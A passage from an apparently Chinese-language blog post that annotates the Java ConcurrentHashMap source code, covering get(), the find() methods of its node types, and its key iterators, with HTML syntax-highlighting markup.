&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">init</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;                           <span class="comment">// Initialize table</span></span><br><span class="line">                <span class="keyword">if</span> (counterCells == as) &#123;</span><br><span class="line">                    CounterCell[] rs = <span class="keyword">new</span> <span class="title class_">CounterCell</span>[<span class="number">2</span>];</span><br><span class="line">                    rs[h &amp; <span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">CounterCell</span>(x);</span><br><span class="line">                    counterCells = rs;</span><br><span class="line">                    init = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                cellsBusy = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (init)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapLong(<span class="built_in">this</span>, BASECOUNT, v = baseCount, v + x))</span><br><span class="line">            <span class="keyword">break</span>;                          <span class="comment">// Fall back on using base</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="7-get-Object-key"><a href="#7-get-Object-key" class="headerlink" title="7. get(Object key)"></a>7. get(Object key)</h1><p>获取key对应的值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; e, p; <span class="type">int</span> n, eh; K ek;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> spread(key.hashCode());</span><br><span class="line">    <span class="keyword">if</span> ((tab = table) != <span class="literal">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (e = tabAt(tab, (n - <span class="number">1</span>) &amp; h)) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((eh = e.hash) == h) &#123;</span><br><span class="line">            <span class="comment">// hash值相等，key完全相同，直接返回当前节点的值。（首节点）</span></span><br><span class="line">            <span class="keyword">if</span> ((ek = e.key) == key || (ek != <span class="literal">null</span> &amp;&amp; key.equals(ek)))</span><br><span class="line">                <span class="keyword">return</span> e.val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// hash为负数，调用具体节点类型各自的find实现，详细：7.1</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (eh &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> (p = e.find(h, key)) != <span class="literal">null</span> ? p.val : <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// hash为非负数，直接遍历查找。</span></span><br><span class="line">        <span class="keyword">while</span> ((e = e.next) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e.hash == h &amp;&amp;</span><br><span class="line">                ((ek = e.key) == key || (ek != <span class="literal">null</span> &amp;&amp; key.equals(ek))))</span><br><span class="line">                <span class="keyword">return</span> e.val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-1-find-int-h-Object-k"><a href="#7-1-find-int-h-Object-k" class="headerlink" title="7.1 find(int h, Object k)"></a>7.1 find(int h, Object k)</h2><h3 id="1）Node类find实现"><a href="#1）Node类find实现" class="headerlink" title="1）Node类find实现"></a>1）Node类find实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 直接单链表遍历。</span></span><br><span class="line">Node&lt;K,V&gt; <span class="title function_">find</span><span class="params">(<span class="type">int</span> h, Object k)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt; e = <span class="built_in">this</span>;</span><br><span class="line">    <span class="keyword">if</span> (k != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            K ek;</span><br><span class="line">            <span class="keyword">if</span> (e.hash == h &amp;&amp;</span><br><span class="line">                ((ek = e.key) == k || (ek != <span class="literal">null</span> &amp;&amp; k.equals(ek))))</span><br><span class="line">                <span class="keyword">return</span> e;</span><br><span class="line">        &#125; <span class="keyword">while</span> ((e = e.next) != <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2）ForwardingNode类find实现"><a href="#2）ForwardingNode类find实现" class="headerlink" title="2）ForwardingNode类find实现"></a>2）ForwardingNode类find实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 遍历ForwardingNode的nextTable</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ForwardingNode</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">Node</span>&lt;K,V&gt; &#123;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;K,V&gt;[] nextTable;</span><br><span class="line">    ForwardingNode(Node&lt;K,V&gt;[] tab) &#123;</span><br><span class="line">        <span class="built_in">super</span>(MOVED, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="built_in">this</span>.nextTable = tab;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Node&lt;K,V&gt; <span class="title function_">find</span><span class="params">(<span class="type">int</span> h, Object k)</span> &#123;</span><br><span class="line">        <span class="comment">// loop to avoid arbitrarily deep recursion on forwarding nodes</span></span><br><span class="line">        outer: <span class="keyword">for</span> (Node&lt;K,V&gt;[] tab = nextTable;;) &#123;</span><br><span class="line">            Node&lt;K,V&gt; e; <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">if</span> (k == <span class="literal">null</span> || tab == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span> ||</span><br><span class="line">                (e = tabAt(tab, (n - <span class="number">1</span>) &amp; h)) == <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="type">int</span> eh; K ek;</span><br><span class="line">                <span class="keyword">if</span> ((eh = e.hash) == h &amp;&amp;</span><br><span class="line">                    ((ek = e.key) == k || (ek != <span class="literal">null</span> &amp;&amp; k.equals(ek))))</span><br><span class="line">                    <span class="keyword">return</span> e;</span><br><span class="line">                <span class="keyword">if</span> (eh &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e <span class="keyword">instanceof</span> ForwardingNode) &#123;</span><br><span class="line">                        tab = ((ForwardingNode&lt;K,V&gt;)e).nextTable;</span><br><span class="line">                        <span class="keyword">continue</span> outer;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        <span class="comment">// hash &lt; 0，继续调用e对象（可能是其它类型的节点）的find方法。</span></span><br><span class="line">                        <span class="keyword">return</span> e.find(h, k);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ((e = e.next) == <span class="literal">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3）ReservationNode类find实现"><a href="#3）ReservationNode类find实现" class="headerlink" title="3）ReservationNode类find实现"></a>3）ReservationNode类find实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ReservationNode</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">Node</span>&lt;K,V&gt; &#123;</span><br><span class="line">    ReservationNode() &#123;</span><br><span class="line">        <span class="built_in">super</span>(RESERVED, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Node&lt;K,V&gt; <span class="title function_">find</span><span class="params">(<span class="type">int</span> h, Object k)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4）TreeNode类find实现"><a href="#4）TreeNode类find实现" class="headerlink" title="4）TreeNode类find实现"></a>4）TreeNode类find实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 红黑树节点</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TreeNode</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">Node</span>&lt;K,V&gt; &#123;</span><br><span class="line">    TreeNode&lt;K,V&gt; parent;  <span class="comment">// red-black tree links</span></span><br><span class="line">    TreeNode&lt;K,V&gt; left;</span><br><span class="line">    TreeNode&lt;K,V&gt; right;</span><br><span class="line">    TreeNode&lt;K,V&gt; prev;    <span class="comment">// needed to unlink next upon deletion</span></span><br><span class="line">    <span class="type">boolean</span> red;</span><br><span class="line"></span><br><span class="line">    TreeNode(<span class="type">int</span> hash, K key, V val, Node&lt;K,V&gt; next,</span><br><span class="line">             TreeNode&lt;K,V&gt; parent) &#123;</span><br><span class="line">        <span class="built_in">super</span>(hash, key, val, next);</span><br><span class="line">        <span class="built_in">this</span>.parent = parent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Node&lt;K,V&gt; <span class="title function_">find</span><span class="params">(<span class="type">int</span> h, Object k)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> findTreeNode(h, k, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 根据hash值大小确定遍历方向，若hash值一样且key实现了Comparable接口，则通过compareTo决定。若没实现Comparable接口，先遍历右子树，再遍历左子树。</span></span><br><span class="line">    <span class="keyword">final</span> TreeNode&lt;K,V&gt; <span class="title function_">findTreeNode</span><span class="params">(<span class="type">int</span> h, Object k, Class&lt;?&gt; kc)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (k != <span class="literal">null</span>) &#123;</span><br><span class="line">            TreeNode&lt;K,V&gt; p = <span class="built_in">this</span>;</span><br><span class="line">            <span class="keyword">do</span>  &#123;</span><br><span class="line">                <span class="type">int</span> ph, dir; K pk; TreeNode&lt;K,V&gt; q;</span><br><span class="line">                TreeNode&lt;K,V&gt; pl = p.left, pr = p.right;</span><br><span class="line">                <span class="keyword">if</span> ((ph = p.hash) &gt; h)</span><br><span class="line">                    p = pl;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (ph &lt; h)</span><br><span class="line">                    p = pr;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ((pk = p.key) == k || (pk != <span class="literal">null</span> &amp;&amp; k.equals(pk)))</span><br><span class="line">                    <span class="keyword">return</span> p;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (pl == <span class="literal">null</span>)</span><br><span class="line">                    p = pr;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (pr == <span class="literal">null</span>)</span><br><span class="line">                    p = pl;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ((kc != <span class="literal">null</span> ||</span><br><span class="line">                          (kc = comparableClassFor(k)) != <span class="literal">null</span>) &amp;&amp;</span><br><span class="line">                         (dir = compareComparables(kc, k, pk)) != <span class="number">0</span>)</span><br><span class="line">                    p = (dir &lt; <span class="number">0</span>) ? pl : pr;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ((q = pr.findTreeNode(h, k, kc)) != <span class="literal">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> q;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    p = pl;</span><br><span class="line">            &#125; <span class="keyword">while</span> (p != <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5）TreeBin类find实现"><a href="#5）TreeBin类find实现" class="headerlink" title="5）TreeBin类find实现"></a>5）TreeBin类find实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TreeNode&lt;K,V&gt; root;</span><br><span class="line"><span class="keyword">volatile</span> TreeNode&lt;K,V&gt; first;</span><br><span class="line"><span class="keyword">volatile</span> Thread waiter;</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> lockState;</span><br><span class="line"><span class="comment">// values for lockState</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">WRITER</span> <span class="operator">=</span> <span class="number">1</span>; <span class="comment">// set while holding write lock，写锁，二进制为：001</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">WAITER</span> <span class="operator">=</span> <span class="number">2</span>; <span class="comment">// set when waiting for write lock，等待写锁，二进制为：010</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">READER</span> <span class="operator">=</span> <span class="number">4</span>; <span class="comment">// increment value for setting read lock，读锁，二进制为：100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title function_">find</span><span class="params">(<span class="type">int</span> h, Object k)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (k != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Node&lt;K,V&gt; e = first; e != <span class="literal">null</span>; ) &#123;</span><br><span class="line">            <span class="type">int</span> s; K ek;</span><br><span class="line">            <span class="comment">// 锁状态为写锁或等带写锁时，可通过单链表方式遍历。</span></span><br><span class="line">            <span class="keyword">if</span> (((s = lockState) &amp; (WAITER|WRITER)) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (e.hash == h &amp;&amp;</span><br><span class="line">                    ((ek = e.key) == k || (ek != <span class="literal">null</span> &amp;&amp; k.equals(ek))))</span><br><span class="line">                    <span class="keyword">return</span> e;</span><br><span class="line">                e = e.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 无锁或读锁时，通过CAS添加读锁。</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, LOCKSTATE, s,</span><br><span class="line">                                         s + READER)) &#123;</span><br><span class="line">                TreeNode&lt;K,V&gt; r, p;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    p = ((r = root) == <span class="literal">null</span> ? <span class="literal">null</span> :</span><br><span class="line">                         <span class="comment">// 红黑树查找节点，详细：6.14。</span></span><br><span class="line">                         r.findTreeNode(h, k, <span class="literal">null</span>));</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    Thread w;</span><br><span class="line">                    <span class="comment">// 最后去除读锁</span></span><br><span class="line">                    <span class="keyword">if</span> (U.getAndAddInt(<span class="built_in">this</span>, LOCKSTATE, -READER) ==</span><br><span class="line">                        (READER|WAITER) &amp;&amp; (w = waiter) != <span class="literal">null</span>)</span><br><span class="line">                        LockSupport.unpark(w);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="8-迭代器（间接遍历）"><a href="#8-迭代器（间接遍历）" class="headerlink" title="8. 迭代器（间接遍历）"></a>8. 迭代器（间接遍历）</h1><h2 id="基类BaseIterator"><a href="#基类BaseIterator" class="headerlink" title="基类BaseIterator"></a>基类BaseIterator</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">BaseIterator</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">Traverser</span>&lt;K,V&gt; &#123;</span><br><span class="line">    <span class="keyword">final</span> ConcurrentHashMap&lt;K,V&gt; map;</span><br><span class="line">    Node&lt;K,V&gt; lastReturned;</span><br><span class="line">    BaseIterator(Node&lt;K,V&gt;[] tab, <span class="type">int</span> size, <span class="type">int</span> index, <span class="type">int</span> limit,</span><br><span class="line">                 ConcurrentHashMap&lt;K,V&gt; map) &#123;</span><br><span class="line">        <span class="built_in">super</span>(tab, size, index, limit);</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        advance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span> &#123; <span class="keyword">return</span> next != <span class="literal">null</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">hasMoreElements</span><span class="params">()</span> &#123; <span class="keyword">return</span> next != <span class="literal">null</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">()</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; p;</span><br><span class="line">        <span class="keyword">if</span> ((p = lastReturned) == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>();</span><br><span class="line">        lastReturned = <span class="literal">null</span>;</span><br><span class="line">        map.replaceNode(p.key, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="8-1-keySet"><a href="#8-1-keySet" class="headerlink" title="8.1 keySet()"></a>8.1 keySet()</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> KeySetView&lt;K,V&gt; <span class="title function_">keySet</span><span class="params">()</span> &#123;</span><br><span class="line">    KeySetView&lt;K,V&gt; ks;</span><br><span class="line">    <span class="keyword">return</span> (ks = keySet) != <span class="literal">null</span> ? ks : (keySet = <span class="keyword">new</span> <span class="title class_">KeySetView</span>&lt;K,V&gt;(<span class="built_in">this</span>, <span class="literal">null</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-1-1-KeySetView"><a href="#8-1-1-KeySetView" class="headerlink" title="8.1.1 KeySetView"></a>8.1.1 KeySetView</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">KeySetView</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">CollectionView</span>&lt;K,V,K&gt;</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">Set</span>&lt;K&gt;, java.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7249069246763182397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> V value;</span><br><span class="line">    KeySetView(ConcurrentHashMap&lt;K,V&gt; map, V value) &#123;  <span class="comment">// non-public</span></span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.value = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Returns the default mapped value for additions,</span></span><br><span class="line"><span class="comment">         * or &#123;<span class="doctag">@code</span> null&#125; if additions are not supported.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span> the default mapped value for additions, or &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment">         * if not supported</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="keyword">public</span> V <span class="title function_">getMappedValue</span><span class="params">()</span> &#123; <span class="keyword">return</span> value; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@throws</span> NullPointerException if the specified key is null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(Object o)</span> &#123; <span class="keyword">return</span> map.containsKey(o); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Removes the key from this map view, by removing the key (and its</span></span><br><span class="line"><span class="comment">         * corresponding value) from the backing map.  This method does</span></span><br><span class="line"><span class="comment">         * nothing if the key is not in the map.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span>  o the key to be removed from the backing map</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if the backing map contained the specified key</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@throws</span> NullPointerException if the specified key is null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">remove</span><span class="params">(Object o)</span> &#123; <span class="keyword">return</span> map.remove(o) != <span class="literal">null</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span> an iterator over the keys of the backing map</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="keyword">public</span> Iterator&lt;K&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] t;</span><br><span class="line">        ConcurrentHashMap&lt;K,V&gt; m = map;</span><br><span class="line">        <span class="type">int</span> <span class="variable">f</span> <span class="operator">=</span> (t = m.table) == <span class="literal">null</span> ? <span class="number">0</span> : t.length;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">KeyIterator</span>&lt;K,V&gt;(t, f, <span class="number">0</span>, f, m);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Adds the specified key to this set view by mapping the key to</span></span><br><span class="line"><span class="comment">         * the default mapped value in the backing map, if defined.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> e key to be added</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if this set changed as a result of the call</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@throws</span> NullPointerException if the specified key is null</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@throws</span> UnsupportedOperationException if no default mapped value</span></span><br><span class="line"><span class="comment">         * for additions was provided</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(K e)</span> &#123;</span><br><span class="line">        V v;</span><br><span class="line">        <span class="keyword">if</span> ((v = value) == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">        <span class="keyword">return</span> map.putVal(e, v, <span class="literal">true</span>) == <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Adds all of the elements in the specified collection to this set,</span></span><br><span class="line"><span class="comment">         * as if by calling &#123;<span class="doctag">@link</span> #add&#125; on each one.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> c the elements to be inserted into this set</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if this set changed as a result of the call</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@throws</span> NullPointerException if the collection or any of its</span></span><br><span class="line"><span class="comment">         * elements are &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@throws</span> UnsupportedOperationException if no default mapped value</span></span><br><span class="line"><span class="comment">         * for additions was provided</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">addAll</span><span class="params">(Collection&lt;? extends K&gt; c)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">added</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        V v;</span><br><span class="line">        <span class="keyword">if</span> ((v = value) == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">        <span class="keyword">for</span> (K e : c) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.putVal(e, v, <span class="literal">true</span>) == <span class="literal">null</span>)</span><br><span class="line">                added = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> added;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (K e : <span class="built_in">this</span>)</span><br><span class="line">            h += e.hashCode();</span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        Set&lt;?&gt; c;</span><br><span class="line">        <span class="keyword">return</span> ((o <span class="keyword">instanceof</span> Set) &amp;&amp;</span><br><span class="line">                ((c = (Set&lt;?&gt;)o) == <span class="built_in">this</span> ||</span><br><span class="line">                 (containsAll(c) &amp;&amp; c.containsAll(<span class="built_in">this</span>))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Spliterator&lt;K&gt; <span class="title function_">spliterator</span><span class="params">()</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] t;</span><br><span class="line">        ConcurrentHashMap&lt;K,V&gt; m = map;</span><br><span class="line">        <span class="type">long</span> <span class="variable">n</span> <span class="operator">=</span> m.sumCount();</span><br><span class="line">        <span class="type">int</span> <span class="variable">f</span> <span class="operator">=</span> (t = m.table) == <span class="literal">null</span> ? <span class="number">0</span> : t.length;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">KeySpliterator</span>&lt;K,V&gt;(t, f, <span class="number">0</span>, f, n &lt; <span class="number">0L</span> ? <span class="number">0L</span> : n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">forEach</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> K&gt; action)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (action == <span class="literal">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        Node&lt;K,V&gt;[] t;</span><br><span class="line">        <span class="keyword">if</span> ((t = map.table) != <span class="literal">null</span>) &#123;</span><br><span class="line">            Traverser&lt;K,V&gt; it = <span class="keyword">new</span> <span class="title class_">Traverser</span>&lt;K,V&gt;(t, t.length, <span class="number">0</span>, t.length);</span><br><span class="line">            <span class="keyword">for</span> (Node&lt;K,V&gt; p; (p = it.advance()) != <span class="literal">null</span>; )</span><br><span class="line">                action.accept(p.key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-1-2-KeyIterator"><a href="#8-1-2-KeyIterator" class="headerlink" title="8.1.2 KeyIterator"></a>8.1.2 KeyIterator</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">KeyIterator</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">BaseIterator</span>&lt;K,V&gt;</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">Iterator</span>&lt;K&gt;, Enumeration&lt;K&gt; &#123;</span><br><span class="line">    KeyIterator(Node&lt;K,V&gt;[] tab, <span class="type">int</span> index, <span class="type">int</span> size, <span class="type">int</span> limit,</span><br><span class="line">                ConcurrentHashMap&lt;K,V&gt; map) &#123;</span><br><span class="line">        <span class="built_in">super</span>(tab, index, size, limit, map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> K <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; p;</span><br><span class="line">        <span class="keyword">if</span> ((p = next) == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">        <span class="type">K</span> <span class="variable">k</span> <span class="operator">=</span> p.key;</span><br><span class="line">        lastReturned = p;</span><br><span class="line">        advance();</span><br><span class="line">        <span class="keyword">return</span> k;</span><br><span 